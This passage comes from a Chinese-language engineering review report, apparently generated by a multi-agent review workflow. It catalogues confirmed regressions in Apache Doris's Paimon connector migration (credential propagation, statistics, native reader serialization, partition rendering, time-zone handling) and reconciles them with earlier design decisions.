  - ⚠️ *注:此处 fallback-sweep 判 vended credentials "benign",但路径 8 的 BLOCKER(REST vended credentials 不下发 BE)证伪了对 REST 的 benign 判断 —— 正是因为新 scan 路径不消费 vended StorageProperties,REST 临时凭据丢失致数据不可读。两审在 REST 上结论相反,以路径 8 的 CONFIRMED BLOCKER 为准。*

**Cache 新鲜度**
- connector 不跨调用缓存 paimon Table(PaimonTableResolver.resolve→PaimonCatalogOps.getTable→catalog.getTable 每次),无 stale-snapshot 风险;REFRESH TABLE 拾取新 snapshot。

---

## Completeness / Gaps(critic 评估)

critic 评估:13-path review 广度足、主要 read/MVCC/time-travel/metastore/type-mapping 路径覆盖好(含 native-path 分区渲染 BLOCKER 与 storage-credential BLOCKER)。但发现 digest 未覆盖的 code-grounded gap(均 firsthand 从源验证,非注释):

**HIGH CONFIDENCE,likely real regressions(已纳入补充审查并对抗验证)**
1. **Table-level row-count statistics 静默丢失** — paimon connector 无 getTableStatistics override,fetchRowCount 返 -1 而 legacy 返真实规划行数。退化 Nereids cost model(join order / broadcast 决策)无报错。digest 完全未追踪 statistics/cardinality 路径(路径 5 仅注 sys-table fetchRowCount 返 -1,那里 no-op)。→ 补充审查 **MAJOR CONFIRMED 3/0/0**(StatsCalculator.disableJoinReorderIfStatsInvalid 在 rowCount==-1 时强制 DISABLE_JOIN_REORDER=true 整查询)。
2. **enable_paimon_cpp_reader 路径丢弃** — 新 buildJniScanRange 始终用 Java-object 序列化;legacy 在 flag 设时切换 paimon-native split 序列化供 BE C++ reader。flag 经 session properties 可达且在 regression test 随机化(random.nextBoolean()),exercised 非理论。→ 补充审查 **BLOCKER CONFIRMED 3/0/0**(BE PaimonCppReader._decode_split 对 Java blob 跑 native Deserialize 失败 InternalError)。注:flag 默认 false,故不破坏默认读路径,仅 flag-on 时 deterministic 复现。
3. **path_partition_keys 不由 paimon connector 发出**(hive 兄弟 native-read connector 发出),故 FileQueryScanNode 将分区列计为文件列并在 native ORC/Parquet 读分区表时误分类。→ 补充审查经 BE 代码追踪 **降级为 MINOR**:BE 在 table-format reader 路径从 columns_from_path_keys(新代码确实发出)category-independent 重建分区列;critic 的 BLOCKER 假设(BE 被告 0 path columns → 错行)不成立,因决定性 BE 分类是 columns_from_path_keys-driven 非 category/num_of_columns_from_file-driven。仅 FE-level parity 分歧 + latent fragility。

**MEDIUM / scope-extension**
4. **现有 native-path 分区渲染 BLOCKER 被低估** — 也损坏 TIME 和 BINARY/VARBINARY 分区(后者 legacy 故意跳过),非仅 DATE/TIMESTAMP_LTZ。→ 补充审查三子 finding:BINARY/VARBINARY **CONFIRMED 3/0/0**(legacy throw→skip 整分区 vs 新发 `[B@hash` 非确定性垃圾);TIME 与"完整 switch 移植"两项 **PARTIAL 0/0/3**(legacy TIME 走 `(Long)` cast 对 Integer 抛 CCE 本身就崩,且 TIME 两侧 UNSUPPORTED 致投影/谓词不可达,"legacy 正确"对比不成立 —— 仍真实渲染分歧但严重度夸大)。
5. **latent(当前未激活)batch-mode double-scan hazard** — paimon planScan 忽略 requiredPartitions,若 supportsBatchScan 被启用而不 override planScanForPartitionBatch,每批 re-scan 整表 N-fold 重复行。→ 补充审查 **MINOR**:当前 supportsBatchScan 默认 false,shouldUseBatchMode 短路,不可达;建议加 fail-loud override 或单测钉 supportsBatchScan==false。

**DDL/DML 范围说明**
- critic 追踪 DDL write 路径(create/drop table/db)发现 PaimonSchemaBuilder/PaimonConnectorMetadata 为 faithful 移植(location→path rekey、primary-key 解析、comment fallback、identity-only partition guard、force-cascade drop),无新 DDL gap。INSERT/DML 正确 out of scope(legacy paimon 外表数据只读)。

---

## Phase C — reconciliation(findings 落盘后隔离执行;仅分类,不软化)

> 纪律:本节在全部独立 findings 锁定落盘**之后**才执行,把独立 findings 对照**历史决策日志 / auto-memory(均当「待验证声明」,非权威)**,**仅用于分类**(真新发现 / 与既往结论矛盾 / 已知接受 tradeoff)。**严禁**用历史结论回头软化任何独立 finding——下列每条 CONFIRMED finding 的严重度与事实一律保持 Phase Review/Verify 的裁决。

### C.0 头条:既往「review clean」结论被本轮证伪

历史 auto-memory(`catalog-spi-p5-b7-cutover-scope` 记 B7 core cutover「4-lens 对抗 review clean」;B1/B2 设计记忆记各 batch「实现+测绿」)将相关区域记为已验证 / clean。本轮 **fresh clean-room** 在同一区域查出 **11 个 CONFIRMED BLOCKER/MAJOR**,集中于:

- **凭据 / 存储装配(B1 区)**:5 个(P8 REST vended、P8 HMS conf.resources、P9 s3/oss、P9 DLF、+ enable_paimon_cpp_reader 序列化)
- **native 扫描渲染(B2 区)**:3 个(P1 DATE/LTZ、补充 BINARY、补充 fix-scope)
- **统计 / 类型**:getTableStatistics(MAJOR)、P10 NOT NULL(MAJOR)
- **时间旅行(B5b 区)**:P3 TZ alias(MAJOR)

→ 这正是本轮 clean-room 纪律的价值:既往「clean」未能经受新一轮独立对抗审视。下列分类**不回头软化**任何一条。

### C.1 与既往决策「矛盾」(prior tradeoff 的前提被证伪)— 需用户重新定夺

- **P3 — FOR TIME AS OF 在 CST/PST/EST(含 Doris 默认 CST)失败**。既往 `catalog-spi-p5-b5b-design` / `catalog-spi-connector-session-tz-gotcha` 签 **「TZ time-travel fail-loud」**,理由:「连接器禁 import fe-core 别名图,错 TZ→错行不能 degrade」。
  - **矛盾点**:reviewer firsthand 证明 `TimeUtils.timeZoneAliasMap` **仅 4 条**(CST/PRC→Asia/Shanghai、UTC/GMT→UTC),完全可用**内联常量**复刻(与 B1 已采用的「DLF inline keys 避 Aliyun 编译依赖」同手法),既守 no-fe-core-import 规则、又对**真正未知** id 仍 fail-loud。且 **CST 是 Doris 默认 session 时区**,故该「fail-loud」实际把**默认配置**下的 time-travel 打挂,而非仅边角场景。
  - **结论**:既往「accepted tradeoff」建立在「别名不可复刻」的**错误前提**上;独立 finding(MAJOR)成立。建议采纳 reviewer 的 4-条内联修法。

### C.2 「真新发现」(既往未识别为已接受 tradeoff)

- **P9 s3/oss 凭据丢失、P9 DLF 无 OSS 凭据、P8 REST vended creds 不下发 BE、P8 HMS hive.conf.resources 丢弃**(均 CONFIRMED,BLOCKER/MAJOR):根植于 `catalog-spi-p5-b1-design` 的「StorageProperties 禁 import → minimal Configuration 重建」。该**简化本身**是已知的,但「丢弃 *可用* 凭据 → BE 读不到数据」**从未被记为可接受**——反例:B1 自己已用 inline keys 处理 DLF,故漏掉 canonical `s3.access_key`/`s3.secret_key`/`s3.endpoint` 等是**实现疏漏(新回归)**,非有意取舍。
- **enable_paimon_cpp_reader 被忽略、Java 序列化破坏 BE paimon-cpp deserialize**(BLOCKER):任何既往记忆均未覆盖;真新发现。
- **getTableStatistics 未 override → 基表行数恒 -1**(MAJOR):未见既往决策覆盖;真新发现(cost-model 基数恒 UNKNOWN,影响 join order)。
- **P10 read 路径传播 paimon NOT NULL**(MAJOR):未见既往决策覆盖;真新发现,需用户判定「传播 NOT NULL」属有意改进还是 join/null 语义回归(legacy 一律强制 nullable)。
- **P1 native DATE/LTZ 渲染 + 补充 BINARY/fix-scope**(BLOCKER+MAJOR):属 B2 normal-read 区,但既往 b2 记忆仅提「partition_keys vs partition_columns key mismatch(FE 把 paimon 当非分区)」,**未识别** native columnsFromPath 的**值渲染**缺陷(DATE epoch 裸 toString);真新发现。

### C.3 「与既往已知一致」(非本轮新增风险)— 仅登记

- 若干 MINOR/NIT(如 P5 sys-table fail-loud 文案、P13 SHOW CREATE TABLE 仅在 connector properties 非空时发 LOCATION/PROPERTIES)与 `catalog-spi-p5-b4-design` / D-047 properties-map restore 相关,属已知范围,不构成新增 BLOCKER。
- P12 MVCC schemaId 不冻结、P6 intra-query schema/partition 非原子:与既往「B5a query-begin pin」记述同向,登记为 MINOR 一致性裂隙。

### C.4 未被软化声明

本节未下调任何独立 finding 的严重度或事实。Phase Verify 阶段的 PARTIAL / 重定性裁决(P7 DV 路径未归一化、P8 JDBC driver_url、TIME 渲染)均系**对抗 reviewer 的 firsthand 裁决**(基于代码,非历史先验),已在 Executive Summary 如实标注;它们不是被历史结论软化的结果。

---

## 附:Workflow 元信息

- 编排脚本:`plan-doc/reviews/P5-paimon-fullpath-review.workflow.js`(clean-room prompts:仅中性路径名 + 裸文件指针 + legacy 基线 `1872ea05310` + 输出 schema;明令 reviewer 不读 plan-doc/ 决策日志、既往 review、.claude 记忆)。
- 结构:Phase Review(13 fresh reviewers,每路一 subagent)→ Phase Verify(每 BLOCKER/MAJOR 派 3 lens 独立 refuter,majorityRefuted 降级)→ Completeness critic → Supplemental(5 gap,各一 reviewer+verify)→ Synthesis。
- 规模:62 agents、~5.47M subagent tokens、~46 min。
- review-only:未改任何产线代码;未 commit;未 git checkout/restore/stash/reset。
